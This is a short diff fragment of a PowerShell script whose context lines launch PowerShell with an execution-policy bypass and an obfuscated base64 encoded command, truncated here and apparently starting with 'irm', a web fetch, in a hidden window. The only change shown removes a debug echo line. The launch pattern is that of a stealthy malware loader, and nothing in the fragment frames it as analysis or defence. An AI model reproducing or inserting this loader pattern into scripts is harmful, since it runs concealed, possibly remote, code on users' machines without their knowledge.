@@ -4,4 +4,3 @@ $process.StartInfo.Arguments = '-executionpolicy bypass -EncodedCommand aQByAG0A
 $process.StartInfo.UseShellExecute = $false
 $process.StartInfo.CreateNoWindow = $true
 $process.Start() | Out-Null
-echo debug
